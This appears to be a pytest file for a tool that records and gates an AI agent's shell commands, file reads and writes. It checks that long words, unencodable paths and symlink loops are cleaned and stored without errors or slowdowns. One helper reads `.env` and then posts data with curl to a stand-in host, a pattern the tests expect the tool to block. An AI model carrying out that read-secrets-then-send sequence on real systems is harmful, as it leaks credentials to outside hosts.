"""V5b-fix2 §5: a long word or path never raises and is not quadratic.

The cleaner keeps a word as a path only when the file exists inside the workspace, and the history
looks at the paths that survived cleaning. A part over the system's name limit (255 bytes on
APFS and ext4) made `exists()` raise, a word over 1,024 characters made `resolve()` and
`relative_to` slow, and a lone surrogate (JSON allows one) made them raise `ValueError`. Here
every such word gets the answer a short one gets, and the step still reaches the history.
"""

from __future__ import annotations

import errno
import time
from collections.abc import Iterator
from pathlib import Path
from typing import Any

import pytest
from fastapi.testclient import TestClient

import agentfly.recorder.app as app_module
from agentfly.recorder.clean import _project_relative, clean_command
from agentfly.recorder.localstore import local_store
from agentfly.recorder.rules import Session
from agentfly.recorder.store import build_step_record, relative_file_path
from tests.helpers import wallclock
from tests.recorder_harness import Recorder

SHORT = "x"
ALLOW = {"permission": "allow"}
CLIENT_WAIT = 0.5  # agentfly/hook_client.py `_BUDGET_S`: the recorder gets this long

# Name -> the quoted word. The two lengths come with and without a `/`; a part of 19 characters
# is under every name limit, so those words get as far as the system. Then 128 emoji (512 bytes in
# one part) and a path whose file name is 300 emoji (1,200 bytes): both under 1,024 characters.
LONG_WORDS: dict[str, str] = {
    "300": "a" * 300,
    "300-slashes": "a" * 19 + ("/" + "a" * 19) * 14 + "/aaaa",
    "5000": "a" * 5_000,
    "5000-slashes": ("a" * 19 + "/") * 250,
    "128-emoji": "🔑" * 128,
    "path-with-a-300-emoji-name": "d/" + "🔑" * 300,
}


@pytest.fixture()
def workspace(tmp_path: Path) -> Path:
    folder = tmp_path / "ws"
    folder.mkdir()
    return folder


@pytest.fixture()
def rec(tmp_path: Path) -> Iterator[Recorder]:
    previous = app_module._store
    app_module.graph_store.enabled = False
    yield Recorder(tmp_path / "data")
    app_module._store = previous


@pytest.fixture()
def history(tmp_path: Path) -> Iterator[None]:
    """The local store running on a temporary file, as the recorder's lifespan starts it."""
    local_store.start(tmp_path / "history.db")
    yield
    local_store.stop()


def steps_of(chat: str) -> list[dict[str, Any]]:
    assert local_store.flush()
    found = local_store.session_steps(chat)
    assert found is not None, f"{chat}: the chat never reached the history"
    return found[0]


def sends_after_an_env_read(rec: Recorder, workspace: Path, chat: str, word: str) -> dict[str, str]:
    roots = [str(workspace)]
    rec.read(chat, ".env", workspace_roots=roots)
    return rec.run(chat, f"curl https://x.com -d '{word}'", workspace_roots=roots)


@pytest.mark.parametrize("word", LONG_WORDS.values(), ids=LONG_WORDS.keys())
def test_a_long_quoted_word_gets_the_short_words_answer(
    word: str, rec: Recorder, workspace: Path, history: None
) -> None:
    roots = [str(workspace)]
    short = sends_after_an_env_read(rec, workspace, "short", SHORT)
    assert short["permission"] == "deny"  # R1: the .env read, then an outbound send

    assert sends_after_an_env_read(rec, workspace, "long", word) == short
    assert rec.run("fresh", f"echo '{word}'", workspace_roots=roots) == {"permission": "allow"}

    # The step reaches the history, cleaned the way the short word's was.
    [_, long_send] = steps_of("long")
    [_, short_send] = steps_of("short")
    assert long_send["verdict"] == short_send["verdict"] == "blocked"
    assert long_send["command"] == short_send["command"] == "curl x.com -d <arg>"
    [echo] = steps_of("fresh")
    assert (echo["verdict"], echo["command"]) == ("allowed", "echo <arg>")


def test_a_program_name_as_long_as_a_quoted_word_does_not_raise(
    rec: Recorder, workspace: Path, history: None
) -> None:
    """The history asks whether a surviving word is a file (`build_step_record`): a program name
    of 300 characters survives cleaning and is a part over the name limit."""
    program = "a" * 300
    answer = rec.run("p", f"{program} --version", workspace_roots=[str(workspace)])
    assert answer == {"permission": "allow"}
    [step] = steps_of("p")
    assert step["command"] == f"{program} --version"
    assert step["file"] is None


def long_path_under(workspace: Path, length: int = 1_338) -> tuple[str, str]:
    """An absolute path of `length` characters under `workspace` (the length of the one the
    owner's capture held), no part over 100, and the relative form it is saved as."""
    head = f"{workspace}/"
    wanted = length - len(head)
    parts: list[str] = []
    used = 0
    while wanted - used > 100:
        parts.append("p" * 99)
        used += 100  # the part and its slash
    parts.append("f" * (wanted - used))
    relative = "/".join(parts)
    assert len(head + relative) == length
    return head + relative, relative


def test_a_long_read_path_is_saved_relative_as_before(workspace: Path) -> None:
    long_path, relative = long_path_under(workspace)
    expected = Path(long_path).resolve().relative_to(workspace.resolve()).as_posix()
    assert expected == relative
    assert relative_file_path(long_path, workspace) == expected


def test_a_long_read_path_reaches_the_history_relative(
    rec: Recorder, workspace: Path, history: None
) -> None:
    long_path, relative = long_path_under(workspace)
    assert rec.read("r", long_path, workspace_roots=[str(workspace)]) == {"permission": "allow"}
    [step] = steps_of("r")
    assert step["file"] == relative
    assert step["sensitive"] is False


def test_a_read_path_with_a_part_over_the_name_limit_is_saved_relative(
    workspace: Path,
) -> None:
    """`resolve()` does not raise for it (it takes an error from `lstat` for no file); the path
    still comes out relative, as it does today."""
    path = f"{workspace}/{'🔑' * 300}/f.txt"
    expected = Path(path).resolve().relative_to(workspace.resolve()).as_posix()
    assert relative_file_path(path, workspace) == expected == f"{'🔑' * 300}/f.txt"


def test_the_root_itself_is_dot_and_a_slash_root_works(workspace: Path) -> None:
    assert _project_relative(str(workspace), workspace) == "."
    assert _project_relative(".", workspace) == "."
    assert relative_file_path(str(workspace), workspace) == "."
    # Under "/" the path is what `resolve()` makes of it, without the leading slash. On macOS
    # /etc is a link to /private/etc, so the brief's literal "etc/hosts" is "private/etc/hosts"
    # there, as `resolve().relative_to(Path("/"))` has always said.
    hosts = Path("/etc/hosts").resolve().as_posix().lstrip("/")
    assert relative_file_path("/etc/hosts", Path("/")) == hosts
    assert hosts.endswith("etc/hosts")
    assert relative_file_path("/", Path("/")) == "."
    assert _project_relative("/etc/hosts", Path("/")) == hosts
    assert _project_relative("etc/hosts", Path("/")) == hosts
    here = str(workspace.resolve()).lstrip("/")
    assert relative_file_path(str(workspace), Path("/")) == here
    assert _project_relative(str(workspace), Path("/")) == here


def test_a_folder_that_only_starts_like_the_root_is_outside_it(tmp_path: Path) -> None:
    root = tmp_path / "ws"
    root.mkdir()
    (tmp_path / "ws2").mkdir()
    (tmp_path / "ws2" / "f").write_text("x")
    assert _project_relative(str(tmp_path / "ws2" / "f"), root) is None
    assert relative_file_path(str(tmp_path / "ws2" / "f"), root) == "f"  # the base name, as before


def test_a_word_that_is_a_file_inside_the_root_is_saved_relative(workspace: Path) -> None:
    (workspace / "sub").mkdir()
    (workspace / "sub" / "a.py").write_text("x")
    assert _project_relative("sub/a.py", workspace) == "sub/a.py"
    assert _project_relative(str(workspace / "sub" / "a.py"), workspace) == "sub/a.py"
    assert _project_relative("sub/missing.py", workspace) is None
    assert clean_command("python sub/a.py", workspace) == "python sub/a.py"


@pytest.mark.parametrize(
    "word", ["\ud800", "a/\udfff/b", f"{'a' * 20}/\ud800", "a\x00b", "/\ud800"], ids=repr
)
def test_a_word_the_system_cannot_encode_is_not_a_path(word: str, workspace: Path) -> None:
    """A lone surrogate comes from JSON (`"\\ud800"`), a NUL from a quoted string: `ValueError`."""
    assert _project_relative(word, workspace) is None
    assert clean_command(f"echo '{word}'", workspace) == "echo <arg>"
    # The history's own look at a path never raises either: a relative word is its base name.
    assert relative_file_path(word, workspace) == Path(word).name


def test_an_unencodable_absolute_path_is_saved_as_its_base_name(workspace: Path) -> None:
    """`resolve()` fails for it and the history could not store the string-only form
    (`x/\ud800/f`), so it is outside the root: the base name, as before the fallback."""
    assert relative_file_path(f"{workspace}/sub/../x/\ud800/f", workspace) == "f"
    assert relative_file_path(f"{workspace}/a/\ud800/b", workspace) == "b"
    # The older case, unchanged: the last part itself holds the surrogate.
    assert relative_file_path(f"{workspace}/x/\ud800", workspace) == "\ud800"
    assert relative_file_path(f"{workspace}/../outside/\ud800", workspace) == "\ud800"


def test_a_path_the_system_cannot_resolve_is_tidied_by_string_alone(
    workspace: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The fallback (§5) when the string is fine: `normpath` of the absolute path."""
    resolve = Path.resolve

    def refuse_boom(self: Path, strict: bool = False) -> Path:
        if "boom" in self.parts:
            raise OSError(errno.ENAMETOOLONG, "File name too long")
        return resolve(self, strict=strict)

    monkeypatch.setattr(Path, "resolve", refuse_boom)
    assert relative_file_path(f"{workspace}/sub/../boom/f.txt", workspace) == "boom/f.txt"
    assert relative_file_path(f"{workspace}/../boom/f.txt", workspace) == "f.txt"  # outside
    assert relative_file_path(f"{workspace}/boom", workspace) == "boom"


def test_a_surrogate_in_the_root_does_not_raise(workspace: Path) -> None:
    root = Path("/w/\ud800")
    assert _project_relative("x", root) is None
    # The root does not encode either, so nothing is "inside" it: the base name.
    assert relative_file_path("/w/\ud800/a/b", root) == "b"


def test_a_read_path_with_a_surrogate_mid_path_reaches_history_and_the_page(
    rec: Recorder, workspace: Path, history: None
) -> None:
    """The saved value must be one the history can store and `/api/steps` can send."""
    roots = [str(workspace)]
    assert rec.read("s", f"{workspace}/a/\ud800/b", workspace_roots=roots) == ALLOW
    assert (
        rec.send(
            "s",
            "preToolUse",
            tool_name="Write",
            tool_input={"file_path": f"{workspace}/c/\ud800/d"},
            workspace_roots=roots,
        )
        == ALLOW
    )
    assert [step["file"] for step in steps_of("s")] == ["b", "d"]
    page = TestClient(app_module.app, base_url="http://127.0.0.1:8787")  # no lifespan: memory stays
    response = page.get("/api/steps")
    assert response.status_code == 200
    assert [step["file"] for step in response.json()["steps"]] == ["b", "d"]


# ---------------------------------------------------------------- a link that leads back to itself


@pytest.fixture()
def loop(workspace: Path) -> Path:
    """`a -> b -> a` in the workspace: `Path.resolve()` raises `RuntimeError` for either."""
    (workspace / "a").symlink_to("b")
    (workspace / "b").symlink_to("a")
    return workspace


def test_a_link_loop_is_not_a_path_and_is_saved_by_name(loop: Path) -> None:
    assert _project_relative("a", loop) is None
    assert clean_command("cat a", loop) == "cat <arg>"
    assert relative_file_path(str(loop / "a"), loop) == "a"
    assert relative_file_path(str(loop / "sub" / ".." / "b"), loop) == "b"


def test_a_link_loop_in_a_shell_word_a_read_and_a_write_gets_a_normal_answer(
    rec: Recorder, loop: Path, history: None
) -> None:
    roots = [str(loop)]
    assert rec.run("l", "cat a", workspace_roots=roots) == ALLOW
    assert rec.read("l", str(loop / "a"), workspace_roots=roots) == ALLOW
    write = {"tool_name": "Write", "tool_input": {"file_path": str(loop / "a")}}
    assert rec.send("l", "preToolUse", workspace_roots=roots, **write) == ALLOW
    shell, read, wrote = steps_of("l")
    assert (shell["kind"], shell["command"]) == ("shell", "cat <arg>")
    assert (read["kind"], read["file"]) == ("read", "a")
    assert (wrote["kind"], wrote["file"]) == ("edit", "a")


def test_a_step_with_a_long_word_builds_whatever_the_system_says(workspace: Path) -> None:
    """The step is built outside the rules' meter: it must not raise for any word."""
    session = Session(id="s", marked=False, start_time="", next_step=1)
    for word in LONG_WORDS.values():
        payload = {
            "hook_event_name": "beforeShellExecution",
            "command": f"{word} '{word}' {word}",
            "workspace_roots": [str(workspace)],
        }
        record = build_step_record(payload, session, "allow", None, order=1)
        assert record.kind == "shell"


# ---------------------------------------------------------------- speed


def bash_c_with_deep_paths(depth: int, count: int = 300) -> str:
    """`bash -c '<count paths, depth folders each>'`: one word of tens of thousands of characters
    whose parts the system would look up one by one."""
    folders = "/".join(f"d{k}" for k in range(depth))
    return "bash -c '" + " ".join(f"{folders}/f{n}.py" for n in range(count)) + "'"


def timed(rec: Recorder, chat: str, command: str, workspace: Path) -> float:
    started = time.perf_counter()
    rec.run(chat, command, workspace_roots=[str(workspace)])
    return time.perf_counter() - started


@wallclock
def test_bash_c_with_300_deep_paths_is_fast(rec: Recorder, workspace: Path) -> None:
    """The real hook (`apply_rules`: mark, decide, the step for the history) under the default
    rules, on a `bash -c` of 300 paths, 60 folders deep. About 0.14 s to clean it with the guard
    in the author's measurement, 3 s without. The bound is the client's own 0.5 s wait."""
    command = bash_c_with_deep_paths(60)
    assert len(command) > 20_000
    rec.run("warm", command, workspace_roots=[str(workspace)])  # fills the caches
    best = min(timed(rec, f"c{n}", command, workspace) for n in range(3))
    assert best < CLIENT_WAIT, f"{best:.3f} s of {CLIENT_WAIT} s"


def test_the_deep_command_is_cleaned_as_one_unknown_word(workspace: Path) -> None:
    assert clean_command(bash_c_with_deep_paths(60, 5), workspace) == "bash -c <arg>"


def test_the_system_is_asked_about_no_word_over_1024_characters(
    workspace: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    resolve = Path.resolve

    def resolve_short_only(self: Path, strict: bool = False) -> Path:
        assert len(str(self)) <= 1_024 + len(str(workspace)) + 1, "a long word reached resolve()"
        return resolve(self, strict=strict)

    monkeypatch.setattr(Path, "resolve", resolve_short_only)
    assert _project_relative("a/" * 600, workspace) is None
    assert _project_relative("a" * 1_025, workspace) is None
    assert _project_relative("a/" * 400, workspace) is None  # short enough: asked, not a file
